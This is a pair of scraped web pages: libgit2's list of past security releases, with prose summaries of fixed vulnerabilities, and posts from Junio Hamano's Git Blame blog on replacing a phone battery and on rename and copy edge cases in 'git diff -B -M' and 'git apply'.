=== Content from libgit2.org_c75cc695_20250125_092519.html ===


* [Downloads](https://github.com/libgit2/libgit2/releases)
* [Reference](/docs/reference)
* [Learning](/docs)
* [Security](/security)
* [Source](https://github.com/libgit2/libgit2)

[![libgit2](/images/libgit2/logo@2x.png)](/)

# Security Information

Information about security advisories affecting libgit2 and the
releases that provide resolution.

In case you think to have found a security issue with libgit2, please
do not open a public issue. Instead, you can report the issue to the
private mailing list security@libgit2.org.

Previous security releases:

* **[libgit2 v1.7.2](https://github.com/libgit2/libgit2/releases/tag/v1.7.2)** and **[libgit2 v1.6.5](https://github.com/libgit2/libgit2/releases/tag/v1.6.5)**, Feb 6, 2024

  + CVE-2024-24575: a bug in git\_revparse\_single is fixed that could
    have caused the function to enter an infinite loop given
    well-crafted inputs, potentially causing a Denial of Service
    attack in the calling application.
  + CVE-2024-24577: a bug in git\_index\_add is fixed that could have
    caused the function to corrupt its heap and possibly lead to
    arbitrary code execution.
  + A bug in the smart transport negotiation could have caused an
    out-of-bounds read when a remote server did not advertise
    capabilities.
* **[libgit2 v1.5.1](https://github.com/libgit2/libgit2/releases/tag/v1.5.1)** and **[libgit2 v1.4.5](https://github.com/libgit2/libgit2/releases/tag/v1.4.5)**, Jan 20, 2023

  + When using an SSH remote with the optional, included libssh2
    backend, libgit2 does not perform certificate checking by default.
    Prior versions of libgit2 require the caller to set the
    certificate\_check field of libgit2’s git\_remote\_callbacks
    structure - if a certificate check callback is not set, libgit2
    does not perform any certificate checking. This means that by
    default - without configuring a certificate check callback,
    clients will not perform validation on the server SSH keys and
    may be subject to a man-in-the-middle attack.

    Beginning in libgit2 v1.4.5 and v1.5.1, libgit2 will now perform
    host key checking by default. Users can still override the default
    behavior using the certificate\_check function.
* **[libgit2 v1.4.4](https://github.com/libgit2/libgit2/releases/tag/v1.4.4)** and **[libgit2 v1.3.2](https://github.com/libgit2/libgit2/releases/tag/v1.3.2)**, Jul 12, 2022

  + CVE-2022-29187: this provides compatibility with git’s changes to
    address CVE 2022-29187. As a follow up to CVE 2022-24765, now not
    only is the working directory of a non-bare repository examined
    for its ownership, but the .git directory and the .git file (if
    present) are also examined for their ownership.
  + A fix for compatibility with git’s (new) behavior for CVE
    2022-24765 allows users on POSIX systems to access a git
    repository that is owned by them when they are running in sudo.
  + A fix for further compatibility with git’s (existing) behavior for
    CVE 2022-24765 allows users on Windows to access a git repository
    that is owned by the Administrator when running with escalated
    privileges (using runas Administrator).
  + The bundled zlib is updated to v1.2.12, as prior versions had
    memory corruption bugs. It is not known that there is a security
    vulnerability in libgit2 based on these bugs, but we are updating
    to be cautious.
* **[libgit2 v1.4.3](https://github.com/libgit2/libgit2/releases/tag/v1.4.3)** and **[libgit2 v1.3.1](https://github.com/libgit2/libgit2/releases/tag/v1.3.1)**, Apr 12, 2022

  + CVE 2022-24765: libgit2 is not directly affected by this
    vulnerability, because libgit2 does not directly invoke any
    executable. But we are providing these changes as a security
    release for any users that use libgit2 for repository discovery
    and then also use git on that repository. In this release, we will
    now validate that the user opening the repository is the same user
    that owns the on-disk repository. This is to match git’s behavior.
  + Several correctness fixes where invalid input can lead to a crash.
    These may prevent possible denial of service attacks. At this time
    there are not known exploits to these issues.

    - midx: Fix an undefined behavior (left-shift signed overflow)
    - fetch: support OID refspec without dst
    - Fix crash when regenerating a patch with unquoted spaces in
      filename
* **[libgit2 v0.28.4](https://github.com/libgit2/libgit2/releases/tag/v0.28.4)** and **[libgit2 v0.27.10](https://github.com/libgit2/libgit2/releases/tag/v0.27.10)**, Dec 10, 2019

  + CVE-2019-1348: the fast-import stream command “feature
    export-marks=path” allows writing to arbitrary file paths. As
    libgit2 does not offer any interface for fast-import, it is not
    susceptible to this vulnerability.
  + CVE-2019-1349: by using NTFS 8.3 short names, backslashes or
    alternate filesystreams, it is possible to cause submodules to
    be written into pre-existing directories during a recursive
    clone using git. As libgit2 rejects cloning into non-empty
    directories by default, it is not susceptible to this
    vulnerability.
  + CVE-2019-1350: recursive clones may lead to arbitrary remote
    code executing due to improper quoting of command line
    arguments. As libgit2 uses libssh2, which does not require us
    to perform command line parsing, it is not susceptible to this
    vulnerability.
  + CVE-2019-1351: Windows provides the ability to substitute
    drive letters with arbitrary letters, including multi-byte
    Unicode letters. To fix any potential issues arising from
    interpreting such paths as relative paths, we have extended
    detection of DOS drive prefixes to accomodate for such cases.
  + CVE-2019-1352: by using NTFS-style alternative file streams for
    the “.git” directory, it is possible to overwrite parts of the
    repository. While this has been fixed in the past for Windows,
    the same vulnerability may also exist on other systems that
    write to NTFS filesystems. We now reject any paths starting
    with “.git:” on all systems.
  + CVE-2019-1353: by using NTFS-style 8.3 short names, it was
    possible to write to the “.git” directory and thus overwrite
    parts of the repository, leading to possible remote code
    execution. While this problem was already fixed in the past for
    Windows, other systems accessing NTFS filesystems are
    vulnerable to this issue too. We now enable NTFS protecions by
    default on all systems to fix this attack vector.
  + CVE-2019-1354: on Windows, backslashes are not a valid part of
    a filename but are instead interpreted as directory separators.
    As other platforms allowed to use such paths, it was possible
    to write such invalid entries into a Git repository and was
    thus an attack vector to write into the “.git” dierctory. We
    now reject any entries starting with “.git” on all systems.
  + CVE-2019-1387: it is possible to let a submodule’s git
    directory point into a sibling’s submodule directory, which may
    result in overwriting parts of the Git repository and thus lead
    to arbitrary command execution. As libgit2 doesn’t provide any
    way to do submodule clones natively, it is not susceptible to
    this vulnerability. Users of libgit2 that have implemented
    recursive submodule clones manually are encouraged to review
    their implementation for this vulnerability.
* **[libgit2 v0.28.3](https://github.com/libgit2/libgit2/releases/tag/v0.28.3)** and **[libgit2 v0.27.9](https://github.com/libgit2/libgit2/releases/tag/v0.27.9)**, Aug 13, 2019

  + A carefully constructed commit object with a very large number
    of parents may lead to potential out-of-bounds writes or
    potential denial of service.
  + The ProgramData configuration file is always read for compatibility
    with Git for Windows and Portable Git installations. The ProgramData
    location is not necessarily writable only by administrators, so we
    now ensure that the configuration file is owned by the administrator
    or the current user.
* **[libgit2 v0.26.7](https://github.com/libgit2/libgit2/releases/tag/v0.26.7)** and **[libgit2 v0.27.5](https://github.com/libgit2/libgit2/releases/tag/v0.27.5)**, October 5th, 2018

  + Submodule URLs and paths with a leading “-“ are now ignored. This is due to
    the recently discovered CVE-2018-17456, which can lead to arbitrary code
    execution in upstream git. While libgit2 itself is not vulnerable, it can be
    used to inject options in an implementation which performs a recursive clone
    by executing an external command.
  + Submodule URLs and paths with a leading “-“ are now ignored. This is due to
    the recently discovered CVE-2018-17456, which can lead to arbitrary code
    execution in upstream git. While libgit2 itself is not vulnerable, it can be
    used to inject options in an implementation which performs a recursive clone
    by executing an external command.
  + When running repack while doing repo writes, `packfile_load__cb()` could see
    some temporary files in the directory that were bigger than the usual, and
    makes memcmp overflow on the p->pack\_name string. This issue was reported
    and fixed by bisho.
  + The fix to the unbounded recursion introduced a memory leak in the config
    parser. While this leak was never in a public release, the oss-fuzz project
    reported this as issue 10127. The fix was implemented by Nelson Elhage and
    Patrick Steinhardt
  + When parsing “ok” packets received via the smart protocol, our parsing code
    did not correctly verify the bounds of the packets, which could result in a
    heap-buffer overflow. The issue was reported by the oss-fuzz project, issue
    9749 and fixed by Patrick Steinhardt.
  + The parsing code for the smart protocol has been tightened in general,
    fixing heap-buffer overflows when parsing the packet type as well as for
    “ACK” and “unpack” packets. The issue was discovered and fixed by Patrick
    Steinhardt.
  + Fixed potential integer overflows on platforms with 16 bit integers when
    parsing packets for the smart protocol. The issue was discovered and fixed
    by Patrick Steinhardt.
  + Fixed potential NULL pointer dereference when parsing configuration files
    which have “include.path” or “includeIf..path” statements without a value.
* **[libgit2 v0.26.6](https://github.com/libgit2/libgit2/releases/tag/v0.26.6)** and **[libgit2 v0.27.4](https://github.com/libgit2/libgit2/releases/tag/v0.27.4)**, August 6th, 2018

  This is a security release fixing out-of-bounds reads when processing
  smart-protocol “ng” packets. The issue was discovered by the oss-fuzz project,
  issue 9406.
* **[libgit2 v0.26.5](https://github.com/libgit2/libgit2/releases/tag/v0.26.5)** and **[libgit2 v0.27.3](https://github.com/libgit2/libgit2/releases/tag/v0.27.3)**, July 9th, 2018

  These releases fix out-of-bounds reads when reading objects from a packfile.
  This corresponds to CVE-2018-10887 and CVE-2018-10888, which were both reported
  by Riccardo Schirone.

  A specially-crefted delta object in a packfile could trigger an integer overflow
  and thus bypass our input validation, potentially leading to objects containing
  copies of system memory being written into the object database.
* **[libgit2 v0.26.4](https://github.com/libgit2/libgit2/releases/tag/v0.26.4)**, June 4th, 2018

  Fixes insufficient validation of submodule names (CVE-2018-11235, reported by
  Etienne Stalmans) same as v0.27.1.
* **[libgit2 v0.27.1](https://github.com/libgit2/libgit2/releases/tag/v0.27.1)**, May 29th, 2018

  Ignores submodule configuration entries with names which attempt to perform path
  traversal and can be exploited to write to an arbitrary path or for remote code
  execution. `libgit2` itself is not vulnerable to RCE but tool implementations
  which execute hooks after fetching might be. This is CVE-2018-11235.

  It is forbidden for a `.gitmodules` file to be a symlink which could cause a Git
  implementation to write outside of the repository and and bypass the fsck checks
  for CVE-2018-11235.
* **[libgit2 v0.26.2](https://github.com/libgit2/libgit2/releases/tag/v0.26.2)**, March 8th, 2018

  Fixes memory handling issues when reading crafted repository index files. The
  issues allow for possible denial of service due to allocation of large memory
  and out-of-bound reads.

  As the index is never transferred via the network, exploitation requires an
  attacker to have access to the local repository.
* **[libgit2 v0.26.1](https://github.com/libgit2/libgit2/releases/tag/v0.26.1)**, March 7th, 2018

  Updates the bundled zlib to 1.2.11. Users who build the bundled zlib are
  vulnerable to security issues in the prior version.

  This does not affect you if you rely on a system-installed version of zlib. All
  users of v0.26.0 who use the bundled zlib should upgrade to this release.
* **[libgit2 v0.24.6](https://github.com/libgit2/libgit2/releases/tag/v0.24.6)** and **[libgit2 v0.25.1](https://github.com/libgit2/libgit2/releases/tag/v0.25.1)**, January 9th, 2017

  Includes two fixes, one performs extra sanitization for some edge cases in
  the Git Smart Protocol which can lead to attempting to parse outside of the
  buffer.

  The second fix affects the certificate check callback. It provides a `valid`
  parameter to indicate whether the native cryptographic library considered the
  certificate to be correct. This parameter is always `1`/`true` before these
  releases leading to a possible MITM.

  This does not affect you if you do not use the custom certificate callback
  or if you do not take this value into account. This does affect you if
  you use pygit2 or git2go regardless of whether you specify a certificate
  check callback.
* **[libgit2 v0.22.1](https://github.com/libgit2/libgit2/releases/tag/v0.22.1)**, January 16, 2015

  Provides additional protections on symbolic links on case-insensitive
  filesystems, particularly Mac OS X HFS+.
  [Further reading](http://www.edwardthomson.com/blog/another-libgit2-security-update.html).
* **[libgit2 v0.21.3](https://github.com/libgit2/libgit2/releases/tag/v0.21.3)**, December 18, 2015

  Updates protections on the git repository on case-insensitive filesystems,
  including Windows NTFS and Mac OS X HFS+: CVE 2014-9390.
  [Further reading](https://git-blame.blogspot.co.uk/2014/12/git-1856-195-205-214-and-221-and.html).

This open sourced site is [hosted on GitHub.](https://github.com/libgit2/www.libgit2.org)
Patches, suggestions, and comments are welcome.



=== Content from git-blame.blogspot.com_494aa32d_20250126_074652.html ===


# [Git Blame](https://git-blame.blogspot.com/)

Junio C Hamano aka [Gitster](https://plus.google.com/108182106411180467879?rel=author)'s Blog

## Friday, February 27, 2015

### [Nexus 4 still live and kicking](https://git-blame.blogspot.com/2015/02/nexus-4-still-live-and-kicking.html)

My everyday phone for the past few years has been Nexus 4. I also have a Nexus 5, which is slightly larger and with a much better screen, but I never felt a need to switch (I did try to have "Let's use N5 this week" every once in a while, though). Last year's Nexus 6 simply felt too large for me. Besides, it is too expensive for me to buy.

I noticed that my N4 recently stopped picking up NFC and charging via wireless. Later I learned that this is a typical sign that its battery needs replacement. Not because the battery got too weak to hold charge, but because the battery started **bloating**, pushing against the back cover, which necessary antennas are built onto. By slightly raising the back cover by bulging out, the bloated battery breaks the connection from the motherboard to these antennas, which is made only by contact. And that is how NFC and wireless charging are broken.

At least, that is the story I read.

After learning [how to](http://www.makeuseof.com/tag/how-to-replace-the-nexus-4-battery-it-can-be-done-android/), and getting a replacement battery and a few small screw/torx drivers, I opened the phone (which took me some time) and saw this bloated battery.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhSi5n0XnrAZb6uEfUd3aCfXiElmfP0bXPh1b9fuZsG-A6R8QOiqOYFST-dlrF6_gaa4hEqeQgmU9Dqs1JwLvmD4ctk2UvhuM_nQ4sYOkmxscidUmbPF7L_EuYKf8b4mDdGJT3_cINvQuqf/s1600/IMG_20150219_172921.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhSi5n0XnrAZb6uEfUd3aCfXiElmfP0bXPh1b9fuZsG-A6R8QOiqOYFST-dlrF6_gaa4hEqeQgmU9Dqs1JwLvmD4ctk2UvhuM_nQ4sYOkmxscidUmbPF7L_EuYKf8b4mDdGJT3_cINvQuqf/s1600/IMG_20150219_172921.jpg)

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhU1QQTfrrpPP4V1nMmZFQ_w7_JwCeWl5giQONp1TwDDIy0ODiktVJu8Ewa_UEYSeZ6Y6FXA8xbyiePJJJeiD3LuE6Q7WBxOvJzEvH66CE4zXipp3L_V4cGNDfalTNBZkkPLtrzme1DC3xh/s1600/IMG_20150219_172906.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhU1QQTfrrpPP4V1nMmZFQ_w7_JwCeWl5giQONp1TwDDIy0ODiktVJu8Ewa_UEYSeZ6Y6FXA8xbyiePJJJeiD3LuE6Q7WBxOvJzEvH66CE4zXipp3L_V4cGNDfalTNBZkkPLtrzme1DC3xh/s1600/IMG_20150219_172906.jpg)

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiDwdnOzifVUqDM_ezaszGF68ZDnJHCdQ0aERByCg5g4SvtDIuG6vosQHrtCbPI6PoduJ6uRuwOSi9lHLUbcB1hvDnI5ktFFUgn0nph8d_pVe-zXoW2ki6afbqEs0CXT2uYv0gT2clSRu-M/s1600/IMG_20150219_172858.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiDwdnOzifVUqDM_ezaszGF68ZDnJHCdQ0aERByCg5g4SvtDIuG6vosQHrtCbPI6PoduJ6uRuwOSi9lHLUbcB1hvDnI5ktFFUgn0nph8d_pVe-zXoW2ki6afbqEs0CXT2uYv0gT2clSRu-M/s1600/IMG_20150219_172858.jpg)

No wonder the back cover looked warped. After placing the new battery and closing the back, NFC started picking up very reliably and it charges properly on a wireless charger.

Happy ;-)

Posted by

[\_](https://www.blogger.com/profile/04508668132209394366 "author profile")

at

[2:01 PM](https://git-blame.blogspot.com/2015/02/nexus-4-still-live-and-kicking.html "permanent link")

[2 comments:](https://www.blogger.com/comment/fullpage/post/632023420616344756/8618594389657108021)

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=632023420616344756&postID=8618594389657108021&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=8618594389657108021&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=8618594389657108021&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=8618594389657108021&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=8618594389657108021&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=8618594389657108021&target=pinterest "Share to Pinterest")

Labels:
[Random Hacking](https://git-blame.blogspot.com/search/label/Random%20Hacking),
[UnGit](https://git-blame.blogspot.com/search/label/UnGit)

## Sunday, February 8, 2015

### [Fun with "git diff -B -M"](https://git-blame.blogspot.com/2015/02/fun-with-git-diff-b-m.html)

Git lets you view a change that renames an original file A to a new location B while doing some minor edits to its contents as a "rename" patch (i.e. "rename A to B, with the following content differences"). You can even view a change that renames two original files, A and B, by swapping their contents and optionally doing some minor edits to them as a patchset that contains two "rename" patches ("rename A to B" and "rename B to A"). These were invented by me early in Git's life, when Linus was still running the project, back in mid 2005. More recently, other tools (including GNU patch) started understanding patches that use these features.

I however recently noticed a few corner cases that git diff and friends produce a wrong patchset, or git apply fails to apply correctly constructed patches, and I have been thinking about the right fixes to these issues. This article will illustrate these tricky cases and describe my current thinking.

In this write-up, I'll use these terms:

patchset::

Output from a single git diff invocation, which may contain one or more *patch*.

patch::

A part of a *patchset* from a header line that begins with "diff --git" up to (but excluding) the next such header line.

tree::

git diff compares two collections of files; each collection is a *tree*. Left and right sides of the comparison are called *old tree* and *new tree*, respectively. The *tree* to which we attempt to apply a patchset is the *target tree*. The *tree* we would get after a successful application of a patchset is the *resulting tree*. A *tree* does not have to be a tree object—we may be comparing the index and the files in the working tree, for example.

preimage::

postimage::

The *preimage* consists of lines in a patch that are prefixed by "-" (minus) or " " (space) but not "+" (plus) that denote what the patched file ought to have for the patch to apply. The *postimage* consists of lines that are prefixed by "+" (plus) or " " (space) that denote what the patched result ought to look like.

1. Basics

First the basics. Let's think about a patchset with a single patch. What does this patchset tell us?

    diff --git a/major-08.txt b/major-08.txt

    index 680c5f6..5de90cb 100644

    --- a/major-08.txt

    +++ b/major-08.txt

    @@ -1,3 +1,3 @@

    -8. Fortitude.

    +8. Strength.

     This is one of the cardinal virtues, of which I shall speak later.

It obviously tells us that the new tree changed "Fortitude", that used to be in the old tree, to "Strength", but it actually tells us a bit more about the old tree. For this patchset to apply, the target tree must have a file "major-08.txt" that begins with lines we see as the preimage in the patch.

2. Renaming a file

Now let's get a bit fancier and study a patchset with a rename patch. What does this patchset tell us?

    diff --git rws/major-08.txt marseille/major-11.txt

    similarity index 97%

    rename from major-08.txt

    rename to major-11.txt

    index 680c5f6..2ab22a0 100644

    --- rws/major-08.txt

    +++ marseille/major-11.txt

    @@ -1,3 +1,3 @@

    -8. Fortitude.

    +11. Fortitude.

     This is one of the cardinal virtues, of which I shall speak later.

We can see that this is going from the same old tree as the previous one's old tree, renames major-08 to major-11 with slight modification.

It tells us more about the trees, compared to the previous example. For this patchset to apply, the target tree must satisfy the same pre-conditon as the previous one about major-08, and in addition it must lack major-11; otherwise we wouldn't be renaming a new file to it.

So far, things are straight-forward.

In summary:

Rule 1.

A patch from file A to file A requires that file A exists in the target tree with contents that match the preimage of the patch.

Rule 2.

A patch renaming file A to file B requires that file A exists the target tree with contents that match the preimage of the patch. It also requires that file B must not exist in the target tree.

Rule 3.

A patch that creates file A requires that file A does not exist in the target tree.

Rule 4.

A patch that deletes file A requires that file A exists in the target tree with contents that match the preimage of the patch.

The latter two I didn't illustrate with examples, but they should be obvious. Also, we can think of Rule 2 (rename) as a natural extension of Rule 3 (creation) and part of Rule 4 (deletion). When you rename file A to file B, optionally with some content changes, you are:

* creating file B, so the target tree must not have file B already.
* deleting file A, so the target tree must have file A with the content that matches (part of) it.

Similarly, a patch that creates file B by copying file A, optionally with some content changes, you are creating file B, so the target tree must not have file B already. Also, the target tree must have file A with the contents that match the preimage of the patch.

3. First twist: cross renaming

Now, here is the first twist. What does this patchset mean?

    diff --git rws/major-11.txt marseille/major-08.txt

    similarity index 99%

    rename from major-11.txt

    rename to major-08.txt

    index 517d9f8..44e8d3a 100644

    --- rws/major-11.txt

    +++ marseille/major-08.txt

    @@ -1,3 +1,3 @@

    -11. Justice.

    +8. La Justice

     That the Tarot, though it is of all reasonable antiquity, is not of

    diff --git rws/major-08.txt marseille/major-11.txt

    similarity index 97%

    rename from major-08.txt

    rename to major-11.txt

    index 5de90cb..a101d5f 100644

    --- rws/major-08.txt

    +++ marseille/major-11.txt

    @@ -1,3 +1,3 @@

    -8. Strength.

    +11. La Force

     This is one of the cardinal virtues, of which I shall speak later.

This is a "swap" patchset, that swaps major-08 and major-11 with small edit. You would have done something like this to prepare such a change, starting from an old tree with two files with substantially different contents, both of which are of meaningful sizes:

    $ mv major-11.txt tmp

    $ mv major-08.txt major-11.txt

    $ mv tmp major-11.txt

    $ edit major-08.txt major-11.txt ;# just a bit

    $ git commit -m swap major-08.txt major-11.txt

    $ git diff -B -M HEAD^

A patch renaming major-11 to major-08 (i.e. the first one in this two-patch patchset) still requires that major-11 must exist in the target tree for the patchset to apply, which is the first half of Rule 2.

But the other half of Rule 2 is not satisfied. The target of the rename, major-08, has to exist in the target tree; otherwise we cannot rename it to major-11 in the second patch in the patchset. The rule needs a bit of revising, perhaps like this:

Rule 2.

A patch renaming file A to file B requires that file A exists with contents that match its preimage. And file B must not exist in the target tree, unless another patch in the patchset renames file B to some other file (possibly but not necessarily file A).

Of course, for such an "other patch" to be able to rename file B to somewhere else, the target tree is required to have file B.

It is important to have that "unless" part in the revised Rule 2. We need to make sure that we do not allow the sample patchset in "2. Renaming a file" to overwrite an existing file major-11 in the target tree blindly.

4. Second twist: rewriting and copying

The previous one showed how git diff -B -M can be used to detect cross renaming files and apply the resulting patchset (you can circularly rename more than two, i.e. A -> tmp, B -> A, ..., Z -> Y, tmp -> Z). It can also detect when you did this:

    $ cp major-08.txt major-11.txt

    $ edit major-08.txt ;# extensively

    $ git add major-08.txt major-11.txt

    $ git commit -m 'create 11 out of 08, rewrite 08'

    $ git diff -B -M HEAD^

And you would see:

    diff --git a/major-08.txt b/major-08.txt

    dissimilarity index 99%

    index 5de90cb..44e8d3a 100644

    --- a/major-08.txt

    +++ b/major-08.txt

    @@ -1,10 +1,31 @@

    -8. Strength.

    -

    -This is one of the cardinal virtues, of which I shall speak later.

    -...

    -the principle of all force.

    +8. La Justice

    +

    +That the Tarot, though it is of all reasonable antiquity, is not of

    +...

    +via prudentiæ.

    diff --git a/major-08.txt b/major-11.txt

    similarity index 97%

    copy from major-08.txt

    copy to major-11.txt

    index 5de90cb..a101d5f 100644

    --- a/major-08.txt

    +++ b/major-11.txt

    @@ -1,3 +1,3 @@

    -8. Strength.

    +11. La Force

     This is one of the cardinal virtues, of which I shall speak later.

The first patch in the patchset is "a patch from file A to file A", even though it is an extensive rewrite. The target tree is required to have major-08 whose contents match the preimage of the patch (Rule 1). The second patch copies from major-08 to create a new file major-11. The target tree is required to lack major-11 (Rule 3; copying into A is creation of A). It also must have major-08 that begins with the preimage of the patch.

Another thing to note is that an application of a patchset in Git is *not* incremental. Even though the first patch in the patchset talks about extensively rewriting major-08, and the second patch talks about creating major-11 by copying major-08 and then making a minor edit to it, the latter patch is the difference between the major-08 in the old tree and the major-11 in the new tree. It is *not* the difference between these two files in the new tree, i.e. it is not "modify major-08 and then copy the result to major-11 and then edit". If you think about it, this is also consistent with the previous "cross renaming" section. The first patch in the patchset renames major-11 to major-08, and the second patch that renames major-08 to major-11 is *not* about remaing the file that originally was major-11 that the first patch renamed back to its original position. The two patches are not applied incrementally (or sequentially).

So far, all the examples shown above will work correctly with today's Git (some reimplementations of Git may lack support, but at least the one I maintain does work correctly). When you use the old tree as the target tree, git apply accepts the patchset and recreates the new tree correctly.

But if you use the new tree of this example as the target tree and try to use git apply -R to apply the patchset in reverse, it does *not* work correctly. It is a bug.

Currently git apply -R does a nonsense for a copying patch. To reverse any patch, it just swaps the preimage and the postimage, and then swaps the names of the files in the old tree and in the new tree.

But the reverse of "create major-11 by copying major-08 into it and then change Strength to La Force" (which is the second patch in the patchset in this section) is *not* "create major-08 by copying major-11 into it and then change La Force to Strength", which you would get by simply swapping the preimage and the postimage and swapping the names of the files in the second patch.

What should we do to "reverse" a patchset that has copies?

Reverse of "create major-11 by copying major-08" should at least be "remove major-11", and preferably accompanied by "while making sure that major-11 matches the postimage of the patch".

The "preferably" part is a moderately strong preference. When the copying was done without any modification, we would not have any preimage or postimage to enable us to check that the target tree of the reverse application is similar enough to the new tree the patchset was taken from. Instead, we would end up just checking "major-11 exists" and then removing it happily, even if the contents of the file major-11 is vastly different from that of the new tree the patchset was taken from, which feels somewhat unsafe.

Admittedly, the same "it feels unsafe" factor exists when applying a bog-standard pure rename patch (imagine that the example in "2. Renaming a file" was done without editing the first line and kept the original "8. Fortutide." without renumbering it. We would not have any preimage we can use to make sure we are patching the correct file).

But as long as we have patch text that we can use for sanity checking, we should use it, I would think.

5. Third twist: rewriting by copying

If you started from two vastly different files, both of which have contents of meaningful size, and did this:

    $ cp major-08.txt major-11.txt

    $ edit major-11.txt

    $ rm major-08.txt

    $ git commit -m 'rewrite 11 by copying 08' major-08.txt major-11.txt

    $ git diff -B -M HEAD^

You would see this patchset:

    diff --git a/major-08.txt b/major-11.txt

    similarity index 97%

    rename from major-08.txt

    rename to major-11.txt

    index 5de90cb..a101d5f 100644

    --- a/major-08.txt

    +++ b/major-11.txt

    @@ -1,3 +1,3 @@

    -8. Strength.

    +11. La Force

     This is one of the cardinal virtues, of which I shall speak later.

This is another bug. I sent out a warning to both the Git and the Linux kernel mailing list, not to use the "-B -M" options together for this reason.

The revised Rule 2. from "3. First twist" tells us that major-08 must exist in the target tree, which is OK, but also major-11, the target of the rename, must not exist. This makes the resulting patchset unapplicable to the old tree the patchset was taken from, which simply does not make sense.

If you take a diff between states X and Y, you should be able to apply that diff to the state X and the resulting state should be identical to the state Y, and you should be able to apply that diff in reverse to state Y to go back to the state X.

Worse, the reverse of this patchset would apply to the new tree without an error, but does not reproduce the old tree correctly, which is a more serious bug. It instead applies the patch in reverse and recreates the original major-08, but the other file, major-11, is lost.

The patchset does not have enough information for us to recreate its original contents of major-11 we had in the old tree. The patchset says that the contents of major-11 in the new tree came from the contents of major-08 in the old tree, and the major-11 in the new tree does not have any resemblance to major-11 in the old tree. That is not incorrect per-se, but that means that we cannot apply this patchset in reverse.

One possible way to fix this is to include another patch in the same patchset that shows the deletion of major-11. Rule 2. would be further revised to something like:

Rule 2 (revised again).

A patch renaming file A to file B requires that file A exists in the target tree with contents that match the preimage. It also requires that file B does not exist in the target tree, unless another patch in the patchset renames file B to some other file (possibly but not necessarily file A) or removes file B.

Again, that "other patch" in the patchset either renames or removes file B, so that requires that the target tree to have file B with contents that match the preimage of that patch.

More generally, the revised Rule 2. can be split into two parts; the former becomes an extension to Rule 4, and the latter becomes an extension to Rule 3.

* A patch that causes a file A to disappear (i.e. removing file A, or renaming file A to file B) requires that the target tree to have file A, with contents that match the preimage of the patch.
* A patch that causes a file B to appear (i.e. creating file B, or renaming/copying file A to file B) requires the target tree to lack file B, unless another patch in the patchset makes file B disappear (i.e. removing file B or renaming file B to something else).

In any case, a fixed patchset would look like this:

    diff --git a/major-08.txt b/major-11.txt

    similarity index 97%

    rename from major-08.txt

    rename to major-11.txt

    index 5de90cb..a101d5f 100644

    --- a/major-08.txt

    +++ b/major-11.txt

    @@ -1,3 +1,3 @@

    -8. Strength.

    +11. La Force

     This is one of the cardinal virtues, of which I shall speak later.

    diff --git a/major-11.txt b/major-11.txt

    deleted file mode 100644

    index 517d9f8..0000000

    --- a/major-11.txt

    +++ /dev/null

    @@ -1,31 +0,0 @@

    -11. Justice.

    -

    -That the Tarot, though it is of all reasonable antiquity, is not of

    -...

    -via prudentiæ.

And these patches, under the re-revised rules, would apply cleanly to the old tree.

What about the reverse application? It would be a patchset that creates major-11 from nothingness (which is the reversal of a "deletion" patch), and creates major-08 by renaming major-11 and editing. Is the Rule 2. re-revised above sufficient?

The new tree (which is the target of the reverse application) only has major-11 and not major-08, so this rename should go through. The reverse of the deletion of major-11 is a creation of it with the contents fully given as the preimage of the (original) patch before reversing it, so that should also be OK with Rule 3 that is revised in a similar way with that "unless" thing. That is, creating major-11 requires that the old tree does not have major-11, but if another patch in the same patchset renames major-11 away or deletes it, then it is OK for a patch to create major-11. And the reversal of the first patch does rename major-11 to major-08, so all is well.

One disturbing thing about the above plan is that we have this comment at the end of diffcore-rename.c:

         \* We would output this delete record if:

         \*

         \* (1) this is a broken delete and the counterpart

         \*     broken create remains in the output; or

         \* (2) this is not a broken delete, and rename\_dst

         \*     does not have a rename/copy to move p->one->path

         \*     out of existence.

         \*

         \* Otherwise, the counterpart broken create

         \* has been turned into a rename-edit; or

         \* delete did not have a matching create to

         \* begin with.

That is, we have an explicit logic to omit the missing "delete major-11" patch from the patchset. This comes from the very first commit that introduced "diff -B" (f345b0a0 (Add -B flag to diff-\* brothers., 2005-05-30); it is plausible that the above comment came from lack of thinking in the original and not something we did to fix some bugs (if it were the latter, by showing the deletion in the case under discussion to "fix" the patchset in this example would end up breaking the original "fix").

So I would think that the right way to fix this is to stop filtering out the deletion half of the broken pair, even when the other creation-half of the pair no longer is in the output.

Posted by

[\_](https://www.blogger.com/profile/04508668132209394366 "author profile")

at

[6:25 PM](https://git-blame.blogspot.com/2015/02/fun-with-git-diff-b-m.html "permanent link")

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=632023420616344756&postID=3941021102667595732&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=3941021102667595732&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=3941021102667595732&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=3941021102667595732&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=3941021102667595732&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=3941021102667595732&target=pinterest "Share to Pinterest")

Labels:
[Git](https://git-blame.blogspot.com/search/label/Git)

## Thursday, February 5, 2015

### [Git 2.3](https://git-blame.blogspot.com/2015/02/git-23.html)

The latest feature release of Git version control system, version 2.3, is now available at [the usual places](http://git-blame.blogspot.com/p/git-public-repositories.html).

